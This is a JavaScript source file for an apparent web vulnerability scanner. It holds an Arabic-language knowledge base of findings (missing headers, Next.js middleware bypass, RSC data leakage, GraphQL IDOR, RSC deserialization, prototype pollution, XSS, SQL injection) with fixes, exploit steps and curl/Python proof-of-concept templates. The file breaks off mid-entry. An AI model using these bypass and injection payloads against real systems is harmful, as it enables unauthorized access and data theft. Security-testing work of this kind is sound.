/**
 * Falcon MAG — Vulnerability Knowledge Base (Arabic)
 * Auto-attached explanation for every finding type.
 *
 * ADDED 2026-09-18
 */

export const VULN_KNOWLEDGE = {
  // ============================================================
  // HEADERS
  // ============================================================
  "Missing security header: content-security-policy": {
    name: "CSP مفقود",
    severity: "medium",
    category: "Headers",
    icon: "🛡️",
    what: "الموقع لا يُرسل ترويسة Content-Security-Policy في رده. هذه الترويسة هي خط الدفاع الأول ضد هجمات XSS وحقن السكربتات.",
    how: "يُفحص كل رأس HTTP يُعيده السيرفر. إذا كانت الترويسة غائبة → النتيجة.",
    impact: "بدون CSP، أي ثغرة XSS موجودة (حتى لو لم تُكتشف بعد) تكون قابلة للاستغلال بسهولة. يمكن للمهاجم حقن سكربتات سرقة الكوكيز أو إعادة توجيه المستخدم.",
    fix: "أضف الترويسة في الرد: `Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn; object-src 'none'; base-uri 'self'; frame-ancestors 'none'`",
    refs: ["OWASP: Content Security Policy Cheat Sheet", "CWE-693: Protection Mechanism Failure"],
    example: "Header 'content-security-policy' is not set in the response."
  },
  "Missing security header: x-frame-options": {
    name: "X-Frame-Options مفقود",
    severity: "medium",
    category: "Headers",
    icon: "🖼️",
    what: "الترويسة التي تمنع تضمين الموقع داخل iframe على مواقع أخرى.",
    how: "فحص وجود الترويسة في كل رأس HTTP. إذا غابت → vulnerable للـ Clickjacking.",
    impact: "يمكن للمهاجم تضمين موقعك في iframe شفاف على موقع خبيث. الضحية يظن أنه يضغط زراً آمناً لكنه يضغط على زر في موقعك الحقيقي (Clickjacking).",
    fix: "أضف: `X-Frame-Options: DENY` أو `SAMEORIGIN`. الأفضل: استخدم CSP مع `frame-ancestors 'none'`",
    refs: ["OWASP: Clickjacking Defense", "CWE-1021: Improper Restriction of Rendered UI Layers"],
    example: "Header 'x-frame-options' is not set in the response."
  },
  "Missing security header: strict-transport-security": {
    name: "HSTS مفقود",
    severity: "medium",
    category: "Headers",
    icon: "🔒",
    what: "ترويسة HTTP Strict Transport Security — تُجبر المتصفح على استخدام HTTPS فقط.",
    how: "فحص وجود `Strict-Transport-Security` في الرد.",
    impact: "بدونها، المتصفح قد يستخدم HTTP لأول زيارة → المهاجم على نفس الشبكة يمكنه اعتراض الاتصال وتنفيذ هجوم MITM (SSL Strip).",
    fix: "أضف: `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`",
    refs: ["OWASP: HSTS", "CWE-319: Cleartext Transmission of Sensitive Information"],
    example: "Header 'strict-transport-security' is not set in the response."
  },
  "Missing security header: x-content-type-options": {
    name: "X-Content-Type-Options مفقود",
    severity: "low",
    category: "Headers",
    icon: "📎",
    what: "الترويسة التي تمنع المتصفح من تخمين نوع MIME.",
    how: "فحص وجود الترويسة.",
    impact: "قد يخمّن المتصفح نوع ملف خاطئ → تنفيذ ملف نصي كـ JavaScript → XSS.",
    fix: "أضف: `X-Content-Type-Options: nosniff`",
    refs: ["OWASP: MIME Sniffing", "CWE-430: Deployment of Wrong Handler"],
    example: "Header 'x-content-type-options' is not set in the response."
  },
  "Missing security header: referrer-policy": {
    name: "Referrer-Policy مفقود",
    severity: "low",
    category: "Headers",
    icon: "🔗",
    what: "الترويسة التي تتحكم في كمية معلومات Referer المُرسلة للمواقع الأخرى.",
    how: "فحص وجود `Referrer-Policy`.",
    impact: "قد تُسرّب URLs داخلية (مع tokens/paths) لمواقع خارجية عبر الـ Referer header.",
    fix: "أضف: `Referrer-Policy: strict-origin-when-cross-origin`",
    refs: ["OWASP: Referrer Policy"],
    example: "Header 'referrer-policy' is not set in the response."
  },
  "Missing security header: permissions-policy": {
    name: "Permissions-Policy مفقود",
    severity: "low",
    category: "Headers",
    icon: "🎛️",
    what: "الترويسة التي تتحكم في ميزات المتصفح (camera, mic, geolocation).",
    how: "فحص وجود الترويسة.",
    impact: "ميزات المتصفح متاحة لأي iframe → قد تُستغل بمواقع خبيثة.",
    fix: "أضف: `Permissions-Policy: geolocation=(), microphone=(), camera=()`",
    refs: ["OWASP: Permissions Policy"],
    example: "Header 'permissions-policy' is not set in the response."
  },
  "Missing security header: x-xss-protection": {
    name: "X-XSS-Protection مفقود",
    severity: "info",
    category: "Headers",
    icon: "ℹ️",
    what: "فلتر XSS القديم في المتصفحات (deprecated).",
    how: "فحص وجود الترويسة.",
    impact: "لا تأثير عملي — المتصفحات الحديثة أزلته. CSP يحل مكانه.",
    fix: "لا حاجة (استخدم CSP بدلاً منه)",
    refs: ["MDN: X-XSS-Protection"],
    example: "Header 'x-xss-protection' is not set in the response."
  },

  // ============================================================
  // Modern Modules (ADDED 2026-09-19)
  // ============================================================
  "tech_fingerprint": {
    name: "بصمة التقنيات (Tech Fingerprint)",
    severity: "info",
    category: "Recon",
    icon: "🔎",
    cwe: "—",
    what: "تقنية استطلاعية (Reconnaissance) تكشف التقنيات المستخدمة في الموقع: Frontend (Next.js, React, Vue...)، Backend (Express, Django, Laravel...)، CMS (WordPress, Drupal...)، CDN (Cloudflare, Vercel...). هذه المعلومات تُحدد استراتيجية الفحص المناسبة.",
    how: "1) إرسال طلب GET واحد للهدف. 2) تحليل الرؤوس المميزة (x-nextjs-cache, x-vercel-id, cf-ray). 3) البحث في جسم الصفحة عن بصمات regex (self.__next_f, /wp-content/, data-reactroot). 4) فحص الكوكيز (laravel_session, csrftoken). 5) مطابقة النتائج مع قاعدة 25+ تقنية.",
    impact: "ليست ثغرة بحد ذاتها، لكنها **حاسمة للفحوصات** — توجّه الموديولات المناسبة فقط وتوفّر 60% من الوقت. كما تكشف تسريبات معلوماتية (server version, framework).",
    fix: "أزل رؤوس الإصدارات غير الضرورية: `Server`, `X-Powered-By`, `X-AspNet-Version`. لا تُعلن عن التقنيات المستخدمة في التعليقات أو الردود.",
    refs: [
      "OWASP: Fingerprinting",
      "OWASP WSTG: INFO-02 (Fingerprint Web Server)",
      "CWE-200: Exposure of Sensitive Information"
    ],
    example: "Detected: Next.js, React RSC, Vercel",
    exploit_steps: [
      "1. هذه ليست ثغرة للاستغلال — بل تقنية استطلاع",
      "2. استخدم نتائجها لتوجيه الفحوصات الفعلية",
      "3. راجع الرؤوس المسرّبة (Server, X-Powered-By)",
      "4. ابحث عن CVEs معروفة للتقنيات المكتشفة",
      "5. ركّز على التقنيات القديمة (jQuery < 3.5, WordPress < 6.4)"
    ],
    poc_curl: (url) => `# Check headers manually
curl -sI "${url}" | grep -iE "server|x-powered-by|x-nextjs|x-vercel|cf-ray"

# Check body for framework signatures
curl -s "${url}" | grep -oE "(__NEXT_DATA__|__next_f|/wp-content/|data-reactroot|ng-version)" | sort -u`,
    poc_python: (url) => `import requests

# Technology Fingerprint
r = requests.get("${url}", timeout=15, verify=False, allow_redirects=True)

# Headers analysis
interesting = ["server", "x-powered-by", "x-nextjs-cache",
               "x-vercel-id", "cf-ray", "x-aspnet-version"]
print("[*] Headers:")
for h in interesting:
    if h in r.headers:
        print(f"  {h}: {r.headers[h]}")

# Body analysis
signatures = {
    "Next.js": "__NEXT_DATA__",
    "React RSC": "__next_f",
    "WordPress": "/wp-content/",
    "React": "data-reactroot",
    "Angular": "ng-version=",
}
print("[*] Body signatures:")
for tech, sig in signatures.items():
    if sig in r.text:
        print(f"  ✓ {tech}")`,
    exploit_tools: [
      { name: "Wappalyzer", cmd: "https://www.wappalyzer.com/", desc: "Browser extension" },
      { name: "whatweb", cmd: `whatweb "${url}"`, desc: "CLI fingerprinting" },
      { name: "nuclei", cmd: `nuclei -u "${url}" -t technologies/`, desc: "Template-based" },
    ],
  },

  "nextjs_middleware_bypass": {
    name: "Next.js Middleware Bypass",
    severity: "critical",
    category: "Access Control",
    icon: "🚪",
    cvss: "9.1",
    cwe: "CWE-284",
    owasp: "A01:2021 — Broken Access Control",
    what: "ثغرة في Next.js (CVE-2025-29927) تسمح بتجاوز الـ middleware كاملاً عبر رأس `x-middleware-subrequest` الذي يُستخدم داخلياً لتتبع الطلبات الفرعية. المهاجم يرسل الرأس يدوياً → يتخطى middleware المصادقة → يصل لصفحات محمية (/admin, /dashboard) دون تسجيل دخول.",
    how: "1) طلب مسار محمي (مثل /admin) → الحصول على 401/403/302. 2) إعادة نفس الطلب مع رأس `x-middleware-subrequest: 1`. 3) إذا تحوّل الرد إلى 200 → **BYPASS مؤكد**. يتأثر Next.js < 15.2.3, < 14.2.25, < 13.5.9, < 12.3.5.",
    impact: "**تجاوز المصادقة الكامل.** يمكن للمهاجم الوصول لكل المسارات المحمية: لوحات الإدارة، APIs داخلية، إعدادات النظام. قد يؤدي لتصعيد صلاحيات كامل (admin access) بدون أي بيانات اعتماد.",
    fix: "1) حدّث Next.js إلى 15.2.3+ أو 14.2.25+ أو 13.5.9+. 2) إذا لم يمكن التحديث فوراً، احظر الرأس على reverse proxy: `if ($http_x_middleware_subrequest) { return 403; }`. 3) استخدم `Nginx` rule: `proxy_set_header X-Middleware-Subrequest '';` قبل التمرير للـ backend.",
    refs: [
      "CVE-2025-29927 — Next.js Middleware Authorization Bypass",
      "Next.js Security Advisory GHSA-f82v-jwr5-mffw",
      "PortSwigger: Next.js Middleware Bypass"
    ],
    example: "baseline=403, with-header=200",
    exploit_steps: [
      "1. اكتشاف Next.js (بـ tech_fingerprint أو من x-powered-by)",
      "2. تحديد مسار محمي (/admin, /dashboard, /api/admin)",
      "3. طلب عادي: `curl https://target/admin` → 403 Forbidden",
      "4. إعادة الطلب مع الرأس: `curl -H 'x-middleware-subrequest: 1' https://target/admin` → 200 OK",
      "5. استخدم المتصفح لإضافة الرأس: ModHeader extension",
      "6. أو Burp Suite: Proxy → Match/Replace لإضافة الرأس لكل الطلبات",
      "7. إذا نجح → الوصول لكامل لوحة الإدارة بدون مصادقة"
    ],
    poc_curl: (url) => `# Step 1: baseline request (should be blocked)
echo "[1] Baseline:"
curl -sI "${url}/admin" | head -1

# Step 2: bypass attempt
echo "[2] With bypass header:"
curl -sI -H "x-middleware-subrequest: 1" "${url}/admin" | head -1

# If [2] returns 200 while [1] returns 403 → VULNERABLE`,
    poc_python: (url) => `import requests

# CVE-2025-29927 - Next.js Middleware Bypass PoC
target = "${url}"
protected_paths = ["/admin", "/dashboard", "/api/admin"]

def test_bypass(url, path):
    admin_url = url.rstrip("/") + path

    # Baseline
    r1 = requests.get(admin_url, timeout=10, verify=False, allow_redirects=False)
    # With bypass header
    r2 = requests.get(admin_url, headers={"x-middleware-subrequest": "1"},
                     timeout=10, verify=False, allow_redirects=False)

    print(f"[*] {path}")
    print(f"    baseline:    {r1.status_code}")
    print(f"    with-header: {r2.status_code}")

    if r1.status_code in (401, 403, 302) and r2.status_code == 200:
        print(f"    [!] VULNERABLE — bypass confirmed!")
        return True
    return False

for path in protected_paths:
    if test_bypass(target, path):
        break`,
    exploit_tools: [
      { name: "curl", cmd: `curl -H "x-middleware-subrequest: 1" "${url}/admin"`, desc: "Direct bypass" },
      { name: "Burp Suite", cmd: "Proxy → Match/Replace → Add header", desc: "Auto-inject header" },
      { name: "ModHeader", cmd: "Browser extension", desc: "Manual testing" },
    ],
  },

  "rsc_data_leakage": {
    name: "RSC Data Leakage",
    severity: "high",
    category: "Information Disclosure",
    icon: "💧",
    cvss: "7.5",
    cwe: "CWE-200",
    what: "تسريب بيانات حساسة داخل الـ hydration state في Next.js: `__NEXT_DATA__` (Pages Router) أو `self.__next_f.push` (App Router / RSC). الـ Server Components ترسل كائنات كاملة للـ Client (بما فيها password_hash, api_keys, internal_notes) دون تصفية.",
    how: "1) GET الصفحة. 2) استخراج `<script id=\"__NEXT_DATA__\">` أو `self.__next_f.push([1, \"...\"])`. 3) تحليل JSON بشكل recurse للبحث عن keys حساسة (password, token, secret, api_key). 4) فحص regex للقيم (JWT, AWS keys, Stripe keys). 5) إذا وُجد → تسريب مؤكد.",
    impact: "**تسريب بيانات مباشر** يمكن قراءته من أي شخص (بدون auth). يعرض: كلمات مرور مشفرة، API keys، tokens داخلية، emails خاصة، بيانات PII. قد يؤدي لاختراق كامل إذا تسرّب JWT أو مفتاح API.",
    fix: "1) لا تمرّر كائنات DB كاملة للـ client. استخدم DTOs / ViewModels. 2) فلترة صريحة: `const { password, ...safe } = user`. 3) في Next.js: `use server` بحذر. 4) تحقق من مخرجات `getServerSideProps` و `getStaticProps`. 5) استخدم `serialize-javascript` مع قائمة بيضاء.",
    refs: [
      "Next.js Security: Data Serialization",
      "CWE-200: Exposure of Sensitive Information",
      "OWASP: Sensitive Data Exposure"
    ],
    example: "Found 3 potential data leaks in __NEXT_DATA__",
    exploit_steps: [
      "1. زُر الصفحة الرئيسية (View Source)",
      "2. ابحث في HTML عن `<script id=\"__NEXT_DATA__\">`",
      "3. انسخ JSON وافتحه في محرر (JSON formatter)",
      "4. ابحث عن: password, token, secret, apiKey, ssn, internal",
      "5. أو استخدم كود Python أدناه لأتمتة البحث",
      "6. إذا وُجدت قيم حساسة → تسريب مؤكد، ابلّغ فوراً"
    ],
    poc_curl: (url) => `# Extract __NEXT_DATA__ JSON
curl -s "${url}" | grep -oP '(?<=<script id="__NEXT_DATA__" type="application/json">).*?(?=</script>)' | python3 -m json.tool

# Search for sensitive keys
curl -s "${url}" | grep -iE "password|secret|token|api.?key|internal" | head -20`,
    poc_python: (url) => `import requests
import re
import json

# RSC Data Leakage Scanner
url = "${url}"
r = requests.get(url, timeout=15, verify=False)
html = r.text

sensitive_keys = ["password", "secret", "token", "api_key", "apikey",
                  "private_key", "session", "ssn", "credit_card", "internal"]

# 1) Pages Router: __NEXT_DATA__
m = re.search(r'<script id="__NEXT_DATA__"[^>]*>(.*?)</script>', html, re.DOTALL)
if m:
    print("[*] Found __NEXT_DATA__")
    try:
        data = json.loads(m.group(1))
        # Recursive scan
        def scan(obj, path=""):
            if isinstance(obj, dict):
                for k, v in obj.items():
                    if any(s in k.lower() for s in sensitive_keys):
                        print(f"  [LEAK] {path}.{k} = {str(v)[:80]}")
                    scan(v, f"{path}.{k}")
            elif isinstance(obj, list):
                for i, item in enumerate(obj):
                    scan(item, f"{path}[{i}]")
        scan(data)
    except Exception as e:
        print(f"[!] Parse failed: {e}")

# 2) App Router: self.__next_f.push
fragments = re.findall(r'self\\.__next_f\\.push\\(\\[1,"(.*?)"\\]\\)', html)
if fragments:
    print(f"[*] Found {len(fragments)} RSC fragments")
    combined = "\\n".join(fragments)
    for sk in sensitive_keys:
        for m2 in re.finditer(rf'"{sk}[^"]*"\\s*:\\s*"([^"]+)"', combined, re.I):
            print(f"  [LEAK] {sk} = {m2.group(1)[:80]}")`,
    exploit_tools: [
      { name: "View Source", cmd: "Ctrl+U → search for __NEXT_DATA__", desc: "Manual check" },
      { name: "JSON Formatter", cmd: "https://jsonformatter.org/", desc: "Pretty print" },
      { name: "Burp Suite", cmd: "Search responses for 'token'", desc: "Automated" },
    ],
  },

  "graphql_relay_idor": {
    name: "GraphQL Relay IDOR",
    severity: "high",
    category: "Access Control",
    icon: "🎯",
    cvss: "8.1",
    cwe: "CWE-639",
    owasp: "A01:2021 — Broken Access Control",
    what: "GraphQL Relay يستخدم Global IDs بصيغة base64(\"TypeName:rawId\") مثل `Q29tcGFueTox` = `Company:1`. المهاجم يستطيع تزوير IDs بأنواع حساسة (Admin, SecretAdminSettings, RootUser) واستعلامها عبر `node(id:)` → كشف بيانات غير مصرح بها.",
    how: "1) اكتشاف endpoint GraphQL. 2) الحصول على Global ID شرعي (من viewer/me). 3) Dictionary attack: لكل نوع حساس (Admin, APIKey, RootUser...) + ID (1, 2, admin)، إنشاء Global ID. 4) استعلام `node(id: <forged>) { ... on <Type> { __typename } }`. 5) إذا لم يُرجع خطأ 'type not found' → الثغرة موجودة.",
    impact: "**كشف بيانات داخلية غير مصرح بها.** يمكن قراءة: إعدادات الأدمن، API keys، backup URLs، internal notes، بيانات مستخدمين آخرين. في بعض الحالات → تصعيد صلاحيات كامل.",
    fix: "1) طبّق authorization على مستوى `node()` resolver — تحقق من أن المستخدم مصرح له بهذا النوع. 2) لا تسمح بـ Global IDs لأنواع إدارية عبر public API. 3) استخدم field-level authorization. 4) عطّل `node()` interface إذا لم يكن ضرورياً.",
    refs: [
      "Amin Sadati Research: GraphQL IDOR",
      "OWASP: GraphQL Cheat Sheet",
      "CWE-639: Authorization Bypass Through User-Controlled Key"
    ],
    example: "node(id: Q29tcGFueTox) { ... on SecretAdminSettings { internalKeys } }",
    exploit_steps: [
      "1. اكتشف endpoint GraphQL: `/graphql`, `/api/graphql`, `/gql`",
      "2. احصل على Global ID شرعي (مثلاً من `{ me { id } }`)",
      "3. فك الـ base64: `echo Q29tcGFueTox | base64 -d` → Company:1",
      "4. تعلّم بنية Global IDs: base64(\"TypeName:rawId\")",
      "5. جرّب أنواعاً حساسة: Admin, RootUser, SecretAdminSettings, APIKey",
      "6. استعلم: `query { node(id: \"<forged>\") { ... on <Type> { __typename } } }`",
      "7. إذا نجح → جرّب طلب حقول حساسة: internalKeys, backupDatabaseUrl"
    ],
    poc_curl: (url) => `# Step 1: Find GraphQL endpoint
curl -X POST "${url}/graphql" \\
  -H "Content-Type: application/json" \\
  -d '{"query":"{ __typename }"}'

# Step 2: Forge Global ID (Admin:1 = YWRtaW46MQ==)
FORGED=$(echo -n "Admin:1" | base64)

# Step 3: Try node() query with forged ID
curl -X POST "${url}/graphql" \\
  -H "Content-Type: application/json" \\
  -d "{\\"query\\":\\"query{node(id:\\\\\\"$FORGED\\\\\\"){__typename}}\\"}"`,
    poc_python: (url) => `import requests
import base64
import json

# GraphQL Relay IDOR PoC
endpoint = "${url}/graphql"

# Sensitive type names to test
SENSITIVE_TYPES = [
    "Admin", "AdminUser", "RootUser", "SuperAdmin",
    "SecretAdminSettings", "AdminSettings", "InternalConfig",
    "APIKey", "ApiKey", "Token", "Secret",
    "DatabaseBackup", "InternalNote", "User", "Company",
]
RAW_IDS = ["1", "2", "0", "admin", "root"]

def forge_global_id(typename, raw_id):
    """Global ID = base64(TypeName:rawId)"""
    return base64.b64encode(f"{typename}:{raw_id}".encode()).decode()

def try_node(global_id, typename):
    query = f'query {{ node(id: "{global_id}") {{ __typename ... on {typename} {{ __typename }} }} }}'
    try:
        r = requests.post(endpoint, json={"query": query}, timeout=8, verify=False)
        if r.status_code == 200:
            data = r.json()
            errors = data.get("errors", [])
            if not errors:
                return True, data
            err_text = " ".join(str(e.get("message","")) for e in errors).lower()
            if "unknown type" in err_text or "not found" in err_text:
                return False, None
    except Exception:
        pass
    return False, None

print(f"[*] Testing {len(SENSITIVE_TYPES) * len(RAW_IDS)} combinations...")
for t in SENSITIVE_TYPES:
    for i in RAW_IDS:
        gid = forge_global_id(t, i)
        ok, data = try_node(gid, t)
        if ok:
            print(f"[!] POSSIBLE IDOR: {t}:{i} (gid={gid})")
            print(f"    Response: {json.dumps(data)[:200]}")`,
    exploit_tools: [
      { name: "GraphQL Voyager", cmd: "https://apis.guru/graphql-voyager/", desc: "Visualize schema" },
      { name: "InQL (Burp)", cmd: "Burp extension", desc: "GraphQL testing" },
      { name: "graphql-cop", cmd: "https://github.com/dolevf/graphql-cop", desc: "Automated scanner" },
    ],
  },

  "react2shell_rce": {
    name: "React2Shell RCE (RSC Deserialization)",
    severity: "critical",
    category: "Injection",
    icon: "☠️",
    cvss: "9.8",
    cwe: "CWE-502",
    what: "ثغرة في React Server Components (RSC) عبر بروتوكول Flight. عند فك تسلسل (deserialization) لكائنات مرسلة عبر `text/x-component`، يمكن للمهاجم إرسال مراجع خبيثة ($@1, then, _response) لتنفيذ كود JS على السيرفر (RCE). المرتبطة بـ CVE-2025-55182.",
    how: "1) تأكد أن الهدف Next.js App Router. 2) إرسال POST مع `Content-Type: text/x-component`. 3) payloads مثل `[\"$@1\", {\"then\": true, \"_response\": {}}]`. 4) فحص الرد: 500 + Flight errors (`hasOwnProperty`, `react-server-dom`, `thenable`).",
    impact: "**RCE كامل على السيرفر.** المهاجم ينفذ أوامر نظام (reverse shell, exfiltrate data, pivot داخلي). أعلى خطورة ممكنة.",
    fix: "1) حدّث Next.js إلى آخر إصدار. 2) طبّق WAF rule يحظر `text/x-component` من مصادر غير موثوقة. 3) راقب سجلات الطلبات لـ Content-Type مشبوه. 4) تحقق من سلامة Flight data قبل deserialization.",
    refs: [
      "CVE-2025-55182 — React Server Components Deserialization",
      "React Security Advisory",
      "CWE-502: Deserialization of Untrusted Data"
    ],
    example: "HTTP 500 with 'hasOwnProperty' in response",
    exploit_steps: [
      "1. تأكد أن الموقع Next.js App Router (بـ tech_fingerprint)",
      "2. اكتشف Server Actions: ابحث عن `Next-Action` header في طلبات",
      "3. أرسل Flight payload بسيط للاختبار",
      "4. راقب status code (500 متوقع عند الثغرة)",
      "5. راقب جسم الرد لـ Flight traces",
      "6. إذا ظهرت traces → استخدم gadget chains متقدمة",
      "7. ⚠️ تحذير: payloads RCE قد تسبب DoS — استخدمها بحذر"
    ],
    poc_curl: (url) => `# Probe Flight deserialization (non-destructive)
curl -X POST "${url}" \\
  -H "Content-Type: text/x-component" \\
  -H "Accept: text/x-component" \\
  -H "Next-Action: x" \\
  -d '["$@1",{"then":true,"_response":{}}]' \\
  -i

# If HTTP 500 + Flight trace → potential RCE surface`,
    poc_python: (url) => `import requests

# React2Shell RCE probe (non-destructive)
url = "${url}"

PAYLOADS = [
    '["$@1",{"then":true,"_response":{}}]',
    '["$1","$@2",{"$2":{"then":"built-in-gadget"}}]',
    '["$@1",{"then":"$1","_response":"$2","$1":{},"$2":{}}]',
]

headers = {
    "Content-Type": "text/x-component",
    "Accept": "text/x-component",
    "Next-Action": "x",
}

for i, payload in enumerate(PAYLOADS):
    try:
        r = requests.post(url, data=payload, headers=headers,
                         timeout=15, verify=False)
        print(f"[{i}] status={r.status_code}, len={len(r.content)}")

        indicators = ["hasOwnProperty", "Flight", "react-server-dom",
                     "thenable", "reading 'then'"]
        found = [ind for ind in indicators if ind.lower() in r.text.lower()]
        if found:
            print(f"    [!] Indicators: {found}")
    except Exception as e:
        print(f"[{i}] ERROR: {e}")`,
    exploit_tools: [
      { name: "Nuclei", cmd: `nuclei -u "${url}" -t cves/2025/`, desc: "Automated CVE detection" },
      { name: "Metasploit", cmd: "search react2shell", desc: "Exploit framework" },
      { name: "Burp Suite", cmd: "Repeater with custom Content-Type", desc: "Manual testing" },
    ],
  },

  "ssr_proto_pollution": {
    name: "SSR Prototype Pollution",
    severity: "critical",
    category: "Injection",
    icon: "☣️",
    cvss: "8.2",
    cwe: "CWE-1321",
    what: "تلويث `Object.prototype` في JavaScript على السيرفر. تُرسل كائنات تحتوي `__proto__` أو `constructor.prototype` إلى API، تُلوّث prototype عالمياً → تغيير سلوك التطبيق كاملاً (تجاوز `if (user.isAdmin)`، RCE محتمل).",
    how: "1) تحديد endpoint يقبل JSON. 2) إرسال `{\"__proto__\": {\"falcon_polluted\": \"marker\"}}`. 3) إعادة تحميل الصفحة الرئيسية. 4) مقارنة hash + length قبل/بعد. 5) إذا تغيّر محتوى الصفحة أو ظهر marker → vulnerable.",
    impact: "**تغيير سلوك التطبيق من الجذر.** يمكن تجاوز فحوصات (`if (user.isAdmin)` → true للجميع)، حقن XSS، DoS، وفي حالات معينة → RCE عبر gadget chains.",
    fix: "1) استخدم `Object.create(null)` بدل `{}`. 2) تجميد prototype: `Object.freeze(Object.prototype)`. 3) تجنب دمج مدخلات المستخدم في كائنات حية. 4) استخدم مكتبات آمنة (lodash 4.17.21+). 5) Node.js: `--disable-proto=delete`.",
    refs: [
      "OWASP: Prototype Pollution",
      "CWE-1321: Improperly Controlled Modification of Object Prototype",
      "PortSwigger: Prototype Pollution"
    ],
    example: "__proto__[falcon_polluted]=marker",
    exploit_steps: [
      "1. ابحث عن endpoints تقبل POST JSON (login, profile, comment)",
      "2. أرسل: `{\"__proto__\": {\"falcon_test\": \"yes\"}}`",
      "3. أو: `{\"constructor\":{\"prototype\":{\"falcon_test\":\"yes\"}}}`",
      "4. أعد تحميل الصفحة الرئيسية",
      "5. إذا تغيّرت الصفحة (broken, marker ظهر) → pollution نجح",
      "6. جرّب تلويث خصائص حساسة: isAdmin, role, verified",
      "7. للحصول على RCE: استخدم gadget chains (child_process, require)"
    ],
    poc_curl: (url) => `# Probe via JSON body
curl -X POST "${url}/api/user" \\
  -H "Content-Type: application/json" \\
  -d '{"__proto__":{"falcon_polluted":"marker"}}'

# Re-fetch homepage to detect pollution
curl -s "${url}/" | grep -i "falcon_polluted"

# Alternative: constructor.prototype
curl -X POST "${url}/api/user" \\
  -H "Content-Type: application/json" \\
  -d '{"constructor":{"prototype":{"falcon_polluted":"marker"}}}'`,
    poc_python: (url) => `import requests
import json
import hashlib

# SSR Prototype Pollution scanner
base = "${url}"
payloads = [
    {"__proto__": {"falcon_polluted": "marker"}},
    {"constructor": {"prototype": {"falcon_polluted": "marker"}}},
    {"__proto__": {"toString": "falcon_marker"}},
]

endpoints = ["/api/user", "/api/profile", "/api/update", "/api/settings"]

def hash_page(url):
    r = requests.get(url, timeout=15, verify=False)
    return hashlib.sha256(r.text.encode()).hexdigest()[:16]

baseline = hash_page(base)
print(f"[*] Baseline: {baseline}")

for ep in endpoints:
    for payload in payloads:
        try:
            url = base.rstrip("/") + ep
            r = requests.post(url, json=payload, timeout=10, verify=False)
            if r.status_code >= 400:
                continue

            # Check if marker echoes
            if "falcon_polluted" in r.text:
                print(f"[!] Marker echoed at {ep}")

            # Check homepage state
            new_hash = hash_page(base)
            if new_hash != baseline:
                print(f"[!] STATE CHANGED! {baseline} → {new_hash}")
                print(f"    via {ep} with {json.dumps(payload)[:80]}")
                break
        except Exception:
            continue`,
    exploit_tools: [
      { name: "Burp Suite", cmd: "Payloads → Proto Pollution", desc: "Manual injection" },
      { name: "pp-finder", cmd: "https://github.com/yeswehack/pp-finder", desc: "Prototype pollution detection" },
      { name: "nuclei", cmd: "nuclei -t prototype-pollution", desc: "Automated" },
    ],
  },

  // ============================================================
  // XSS
  // ============================================================
  "dom_xss_scanner": {
    name: "DOM-Based XSS محتمل",
    severity: "high",
    category: "XSS",
    icon: "💉",
    what: "تمرير بيانات من مصدر غير موثوق (مثل location.href) إلى نقطة حقن خطرة (مثل innerHTML) داخل JavaScript، مما قد يسمح بتنفيذ سكربت.",
    how: "قراءة كل ملفات JS، البحث عن أنماط `location.href → innerHTML` أو `location.search → eval`. عند وجود النمط → نتيجة محتملة.",
    impact: "يمكن للمهاجم حقن كود JavaScript في الصفحة عبر URL أو hash، مما يؤدي إلى سرقة الجلسة، إعادة التوجيه، أو تنفيذ أوامر بصلاحيات المستخدم.",
    fix: "استخدم `textContent` بدلاً من `innerHTML`. استخدم مكتبة مثل DOMPurify لتنقية HTML. طبّق CSP قوياً.",
    refs: ["OWASP: DOM XSS", "CWE-79: Improper Neutralization of Input"],
    example: "location.href flows to innerHTML"
  },
  "xss_scanner": {
    name: "Reflected XSS",
    severity: "high",
    category: "XSS",
    icon: "💉",
    what: "حقن كود JavaScript في معامل URL، يظهر مباشرة في رد الصفحة بدون تنقية.",
    how: "حقن 13 payload مختلف (مثل `<script>alert(1)</script>`) في كل معامل، وفحص إذا ظهر في الرد بسياق قابل للتنفيذ.",
    impact: "يمكن سرقة cookies، إعادة توجيه المستخدم، تنفيذ إجراءات نيابة عنه، أو نشر ديدان.",
    fix: "ترميز كل المخرجات (HTML-encode). استخدم مكتبات آمنة. فعّل CSP.",
    refs: ["OWASP: XSS Prevention", "CWE-79"],
    example: "Payload ظهر في الرد بدون ترميز"
  },

  // ============================================================
  // SQL/NoSQL Injection
  // ============================================================
    "sqli": {
    name: "SQL Injection",
    severity: "critical",
    category: "Injection",
    icon: "💥",
    cvss: "9.8",
    cwe: "CWE-89",
    owasp: "A03:2021 — Injection",
    what: "حقن أوامر SQL في قاعدة البيانات عبر مدخلات المستخدم. تحدث عندما يدمج التطبيق مدخلات المستخدم مباشرة في استعلامات SQL بدون تنقية أو Prepared Statements.",
    how: "1) إرسال payloads اختبارية مثل `'` و `' OR '1'='1` و `' AND SLEEP(5)--`. 2) فحص أخطاء SQL في الرد (Error-based). 3) قياس فروق التوقيت (Time-based blind) — إذا تأخر الرد 5 ثوان → vulnerable. 4) Boolean-based — مقارنة حجم الرد.",
    impact: "قراءة كل قاعدة البيانات (مستخدمين، كلمات مرور، بيانات حساسة)، تعديل/حذف بيانات، تجاوز المصادقة، وقد يصل إلى RCE إذا كانت صلاحيات DB مرتفعة.",
    fix: "1) استخدم Prepared Statements / Parameterized Queries. 2) لا تدمج مدخلات المستخدم في SQL مباشرة. 3) استخدم ORM (SQLAlchemy, Prisma, إلخ). 4) طبّق principle of least privilege على حساب DB. 5) WAF كطبقة دفاع إضافية (ليس بديلاً).",
    refs: [
      "OWASP: SQL Injection",
      "CWE-89: Improper Neutralization of Special Elements in SQL",
      "PortSwigger: SQL Injection Cheat Sheet",
      "OWASP Testing Guide: WSTG-INPV-05"
    ],
    example: "Response delayed by 5.61s (baseline: 0.81s)",

    // ============ جديد ============
    exploit_steps: [
      "1. حدد المعامل القابل للحقن من النتيجة (في مثالنا: `v`)",
      "2. حقن payload بسيط لاختبار SQL errors: `'`",
      "3. إذا لم يظهر خطأ، جرّب Boolean-based: `' AND 1=1--` ثم `' AND 1=2--`",
      "4. لـ Time-based blind، جرّب: `' AND SLEEP(5)--` وقس زمن الرد",
      "5. إذا تأخر الرد 5+ ثوان → الثغرة مؤكدة",
      "6. استخدم sqlmap لاستخراج البيانات تلقائياً (--technique=T)",
      "7. حدد نوع DB (MySQL/PostgreSQL/MSSQL) عبر payloads مختلفة",
      "8. استخرج أسماء الجداول، الأعمدة، والبيانات الحساسة"
    ],

    poc_curl: (url, param, payload) => {
